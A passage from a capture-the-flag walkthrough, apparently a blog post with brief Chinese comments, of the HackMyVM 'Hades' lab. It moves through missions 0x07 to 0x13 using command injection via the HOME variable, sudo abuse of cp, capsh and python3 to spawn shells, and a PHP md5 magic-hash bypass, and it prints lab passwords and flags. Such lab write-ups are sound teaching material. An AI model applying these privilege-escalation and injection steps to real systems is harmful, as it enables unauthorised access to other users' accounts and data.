punctuation">;</span><span class="token number">35</span>:*.emf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogx<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.aac<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.au<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.flac<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.m4a<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mid<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.midi<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mka<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mp3<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mpc<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.ogg<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.ra<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.wav<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.oga<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.opus<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.spx<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.xspf<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*~<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">90</span>:*<span class="token comment">#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:</span>
+<span class="token assign-left variable">SSH_CONNECTION</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token number">38114</span> <span class="token number">127.0</span>.0.1 <span class="token number">22</span>
+<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color
+<span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>aphrodite
+<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
+<span class="token assign-left variable">SSH_CLIENT</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token number">38114</span> <span class="token number">22</span>
+<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+<span class="token assign-left variable">SSH_TTY</span><span class="token operator">=</span>/dev/pts/16
+<span class="token assign-left variable">_</span><span class="token operator">=</span>/usr/bin/env</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token number">123</span>
+aphrodite@hades:/pwned/aphrodite$ ./homecontent 
+The content of your <span class="token environment constant">HOME</span> is:
+/bin/ls: cannot access <span class="token string">'123'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory</code></pre>
+<p>事实如此</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span>
+aphrodite@hades:/pwned/aphrodite$ ./homecontent 
+The content of your <span class="token environment constant">HOME</span> is:
+ariadne_pass.txt  flagz.txt  homecontent  mission.txt</code></pre>
+<p>有点问题</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token string">';id'</span>
+aphrodite@hades:/pwned/aphrodite$ ./homecontent 
+The content of your <span class="token environment constant">HOME</span> is:
+ariadne_pass.txt  flagz.txt  homecontent  mission.txt
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2049</span><span class="token punctuation">(</span>ariadne<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span></code></pre>
+<p>加上单引号结果正确</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token string">';bash'</span>
+aphrodite@hades:/pwned/aphrodite$ ./homecontent 
+The content of your <span class="token environment constant">HOME</span> is:
+ariadne_pass.txt  flagz.txt  homecontent  mission.txt
+ariadne@hades:/pwned/aphrodite$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2049</span><span class="token punctuation">(</span>ariadne<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span>
+ariadne@hades:/pwned/aphrodite$ <span class="token function">ls</span>
+ariadne_pass.txt  flagz.txt  homecontent  mission.txt
+ariadne@hades:/pwned/aphrodite$ <span class="token function">cat</span> ariadne_pass.txt 
+iNgNazuJrmhJKWixktzk</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cat</span> flagz.txt 
+^FuGFaFNhtKNxUInxAtd^</code></pre>
+<h2 id="MISSION-0x08"><a href="#MISSION-0x08" class="headerlink" title="MISSION 0x08"></a>MISSION 0x08</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x08 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user arete lets us use <span class="token function">cp</span> on her behalf. 
+
+<span class="token comment">## ES ##</span>
+La usuaria arete nos deja usar <span class="token function">cp</span> en <span class="token function">su</span> nombre.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cp</span> /run/lock/arete_pass.txt <span class="token builtin class-name">.</span>
+cp: cannot <span class="token function">open</span> <span class="token string">'/run/lock/arete_pass.txt'</span> <span class="token keyword">for</span> reading: Permission denied
+ariadne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> ariadne on hades:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User ariadne may run the following commands on hades:
+    <span class="token punctuation">(</span>arete<span class="token punctuation">)</span> NOPASSWD: /bin/cp</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> arete* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/run/lock/arete_pass.txt
+/var/tmp/arete_pass.txt
+/var/tmp/333/arete
+/var/tmp/arete
+/pwned/arete
+ariadne@hades:~$ <span class="token function">touch</span> /var/tmp/taotao
+ariadne@hades:~$ <span class="token function">chmod</span>  <span class="token number">777</span> /var/tmp/taotao
+ariadne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> arete /bin/cp /run/lock/arete_pass.txt /var/tmp/taotao
+ariadne@hades:~$ <span class="token function">cat</span> /var/tmp/taotao
+QjrIovHacmGWxVjXRLmA</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">ls</span>
+flagz.txt  mission.txt
+arete@hades:~$ <span class="token function">cat</span> flagz.txt 
+^qmrrbGUXLTqLFDyCDlx^</code></pre>
+<h2 id="MISSION-0x09"><a href="#MISSION-0x09" class="headerlink" title="MISSION 0x09"></a>MISSION 0x09</h2><pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x09 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user artemis allows us to use some binary on her behalf. Its a gift<span class="token punctuation">..</span>. 
+
+<span class="token comment">## ES ##</span>
+La usuaria artemis nos permite usar algun binario en <span class="token function">su</span> nombre. Es un regalo<span class="token punctuation">..</span>.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x09 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user artemis allows us to use some binary on her behalf. Its a gift<span class="token punctuation">..</span>. 
+
+<span class="token comment">## ES ##</span>
+La usuaria artemis nos permite usar algun binario en <span class="token function">su</span> nombre. Es un regalo<span class="token punctuation">..</span>.
+arete@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> arete on hades:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User arete may run the following commands on hades:
+    <span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> NOPASSWD: /sbin/capsh</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> artemis /sbin/capsh --
+artemis@hades:/pwned/arete$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span>
+artemis@hades:/pwned/arete$ <span class="token builtin class-name">cd</span> ~
+artemis@hades:~$ <span class="token function">ls</span>
+flagz.txt  mission.txt  restricted
+artemis@hades:~$ <span class="token function">cat</span> flagz.txt 
+^SegGdzPgnNdGAmKjnsa^
+artemis@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> artem* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/usr/share/artemis_pass.txt
+/pwned/artemis
+artemis@hades:~$ <span class="token function">cat</span> /usr/share/artemis_pass.txt
+HIiaojeORLaJBVSPDDCZ</code></pre>
+<h2 id="MISSION-0x10"><a href="#MISSION-0x10" class="headerlink" title="MISSION 0x10"></a>MISSION 0x10</h2><pre class="language-bash" data-language="bash"><code class="language-bash">artemis@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x10 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+We need /bin/bash so that the user asia gives us her password. 
+
+<span class="token comment">## ES ##</span>
+Necesitamos /bin/bash para que la usuaria asia nos de <span class="token function">su</span> password.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">artemis@hades:~$ ./restricted 
+Your <span class="token environment constant">SHELL</span> is: /bin/rbash
+
+djqWtkLisbQlrGtLYHCv</code></pre>
+<p>???点就送?</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">cat</span> flagz.txt 
+^ngXdULWFWKCGtgxAQNv^</code></pre>
+<h2 id="MISSION-0x11"><a href="#MISSION-0x11" class="headerlink" title="MISSION 0x11"></a>MISSION 0x11</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x11 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user asteria is teaching us to program <span class="token keyword">in</span> python. 
+
+<span class="token comment">## ES ##</span>
+La usuaria asteria nos esta enseñando a programar en python.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> asia on hades:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User asia may run the following commands on hades:
+    <span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> asteria /usr/bin/python3 <span class="token parameter variable">-c</span> <span class="token string">'import os; os.system("/bin/sh")'</span>
+$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span>
+$ ^<span class="token punctuation">[</span><span class="token punctuation">[</span>A^<span class="token punctuation">[</span><span class="token punctuation">[</span>A^C
+$ <span class="token function">bash</span>
+asteria@hades:/pwned/asia$ <span class="token builtin class-name">cd</span> ~
+asteria@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">36</span>
+drwxr-x--- <span class="token number">2</span> root    asteria <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root    root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> asteria asteria  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> asteria asteria <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> asteria asteria  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root    asteria   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root    asteria  <span class="token number">145</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rw-r----- <span class="token number">1</span> root    asteria  <span class="token number">161</span> Apr  <span class="token number">5</span> 06:36 sihiri_old.php
+asteria@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> asteria* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/usr/share/doc/asteria_pass.txt
+/pwned/asteria
+asteria@hades:~$ <span class="token function">cat</span> /usr/share/doc/asteria_pass.txt
+hawMVJCYrBgoDAMVhuwT
+asteria@hades:~$ <span class="token function">cat</span> flagz.txt 
+^xSRhIftMsAwWvBAnqNZ^</code></pre>
+<h2 id="MISSION-0x11-1"><a href="#MISSION-0x11-1" class="headerlink" title="MISSION 0x11"></a>MISSION 0x11</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x12 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user astraea believes <span class="token keyword">in</span> magic. 
+
+<span class="token comment">## ES ##</span>
+La usuaria astraea cree en la magia.
+asteria@hades:~$ </code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">cat</span> sihiri_old.php 
+
+<span class="token operator">&lt;</span>?php
+<span class="token variable">$pass</span> <span class="token operator">=</span> hash<span class="token punctuation">(</span><span class="token string">'md5'</span>, <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$pass2</span> <span class="token operator">=</span> hash<span class="token punctuation">(</span><span class="token string">'md5'</span>,<span class="token string">"ASTRAEA_PASS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+if<span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">==</span> <span class="token variable">$pass2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+print<span class="token punctuation">(</span><span class="token string">"ASTRAEA_PASS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+else<span class="token punctuation">&#123;</span>
+print<span class="token punctuation">(</span><span class="token string">"Incorrect ^^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+?<span class="token operator">></span></code></pre>
+<p>md5弱比较</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token builtin class-name">cd</span> /var/www/html
+asteria@hades:/var/www/html$ <span class="token function">ls</span>
+id.zip  irene_auth.php  req.php  request.php  sihiri.php
+asteria@hades:/var/www/html$ <span class="token function">curl</span> <span class="token number">127.0</span>.0.1/sihiri.php?pass<span class="token operator">=</span>s155964671a
+nZkEYtjvHElOtupXKzTE</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">ssh</span> astraea@127.0.0.1
+The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
+ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '</span>/pwned/asteria/.ssh<span class="token string">' (Permission denied).
+Failed to add the host to the list of known hosts (/pwned/asteria/.ssh/known_hosts).
+
+                                                      .     **                                   
+                                                   *           *.                                 
+                                                                  ,*                              
+                                                                     *,                            
+                                             ,                         ,*                         
+                                          .,                              *,                       
+                                       /                                    *                    
+                                    ,*                                        *,                  
+                                 /.                                            .*.                 
+                                                                _____                     
+                __     __           _____         ____________      _____\    \            _____   
+                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \  
+                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    | 
+                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/| 
+                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   || 
+                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/ 
+                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \      
+                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|     
+                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |     
+                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/      
+                                                                        |___|/                     
+        
+                                       **                                    **.                    
+                                          ,*                                **                       
+                                             *,                          ,*                          
+                                                *                      **                            
+                                                *,                .*                              
+                                                   *.           **                                 
+                                                      **      ,*,                                 
+                                                         ** *, 
+                                        [== HMVLabs Chapter 2: Hades ==]
+
+                                         +===========================+
+                                         |        Respect &amp;          |
+                                         |        Have fun!          |
+                                         |                           |
+                                         | https://hackmyvm.eu/hades |
+                                         +===========================+
+
+                                          
+astraea@127.0.0.1'</span>s password: 
+^KssHQIAFsxUamecyXIUk^
+Connection to <span class="token number">127.0</span>.0.1 closed.</code></pre>
+<h2 id="MISSION-0x12"><a href="#MISSION-0x12" class="headerlink" title="MISSION 0x12"></a>MISSION 0x12</h2><p>用密码登ssh连不上</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">astraea@hades.hackmyvm.eu's password: 
+^KssHQIAFsxUamecyXIUk^
+Connection to hades.hackmyvm.eu closed.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ ./busybox <span class="token function">netstat</span> <span class="token parameter variable">-tulnp</span>
+netstat: can't scan /proc - are you root?
+Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.11:38595        <span class="token number">0.0</span>.0.0:*               LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:6667          <span class="token number">0.0</span>.0.0:*               LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:80              <span class="token number">0.0</span>.0.0:*               LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> :::1965                 :::*                    LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> :::21                   :::*                    LISTEN      -
+tcp        <span class="token number">0</span>      <span class="token number">0</span> :::22                   :::*                    LISTEN      -
+udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.11:56483        <span class="token number">0.0</span>.0.0:*                           -
+udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:44595           <span class="token number">0.0</span>.0.0:*                           -
+udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:55168           <span class="token number">0.0</span>.0.0:*                           -</code></pre>
+<p>回到上一个用户，直接把别人传的工具拿来用，执行发现21端口开启了<br>用ftp登录astraea</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">ftp</span> astraea@127.0.0.1
+Connected to <span class="token number">127.0</span>.0.1.
+<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
+<span class="token number">331</span> Please specify the password.
+Password: 
+<span class="token number">230</span> Login successful.
+Remote system <span class="token builtin class-name">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp<span class="token operator">></span> <span class="token function">ls</span>
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">57382</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">150</span> Here comes the directory listing.
+-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>           <span class="token number">21</span> Apr 05 06:36 atalanta.txt
+-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>           <span class="token number">22</span> Apr 05 06:36 flagz.txt
+-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>          <span class="token number">181</span> Apr 05 06:36 mission.txt
+<span class="token number">226</span> Directory send OK.
+ftp<span class="token operator">></span> get flagz.txt
+local: flagz.txt remote: flagz.txt
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">43360</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> flagz.txt <span class="token punctuation">(</span><span class="token number">22</span> bytes<span class="token punctuation">)</span>.
+<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">22</span>       <span class="token number">92.60</span> KiB/s    00:00 ETA
+<span class="token number">226</span> Transfer complete.
+<span class="token number">22</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">23.05</span> KiB/s<span class="token punctuation">)</span>
+ftp<span class="token operator">></span> get mission.txt
+local: mission.txt remote: mission.txt
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">42173</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> mission.txt <span class="token punctuation">(</span><span class="token number">181</span> bytes<span class="token punctuation">)</span>.
+<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">181</span>      <span class="token number">521.40</span> KiB/s    00:00 ETA
+<span class="token number">226</span> Transfer complete.
+<span class="token number">181</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">252.15</span> KiB/s<span class="token punctuation">)</span>
+ftp<span class="token operator">></span> get atalanta.txt
+local: atalanta.txt remote: atalanta.txt
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">34197</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> atalanta.txt <span class="token punctuation">(</span><span class="token number">21</span> bytes<span class="token punctuation">)</span>.
+<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">21</span>       <span class="token number">33.34</span> KiB/s    00:00 ETA
+<span class="token number">226</span> Transfer complete.
+<span class="token number">21</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">19.41</span> KiB/s<span class="token punctuation">)</span>
+ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
+<span class="token number">221</span> Goodbye.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">cat</span> atalanta.txt 
+mUcSNQlaXtwSvGcgeTYZ
+asteria@hades:/var/tmp$ <span class="token function">cat</span> flagz.txt 
+^nqTHTzMzDPDJrKPCfVR^
+asteria@hades:/var/tmp$ <span class="token function">cat</span> mission.txt
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x13 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user atalanta has <span class="token keyword">done</span> something with our account. 
+
+<span class="token comment">## ES ##</span>
+La usuaria atalanta ha hecho algo con nuestra cuenta.</code></pre>
+<h2 id="MISSION-0x13"><a href="#MISSION-0x13" class="headerlink" title="MISSION 0x13"></a>MISSION 0x13</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">cat</span> mission.txt
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x13 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user atalanta has <span class="token keyword">done</span> something with our account. 
+
+<span class="token comment">## ES ##</span>
+La usuaria atalanta ha hecho algo con nuestra cuenta.</code></pre>
+<p>用上题拿到的密码登录atalanta</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">60</span>
+drwxr-x--- <span class="token number">1</span> root     atalanta  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root     root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> atalanta atalanta   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> atalanta atalanta  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> atalanta atalanta   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root     atalanta    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root     atalanta   <span class="token number">237</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-r-sr-s--- <span class="token number">1</span> root     atalanta <span class="token number">16608</span> Apr  <span class="token number">5</span> 06:36 weird
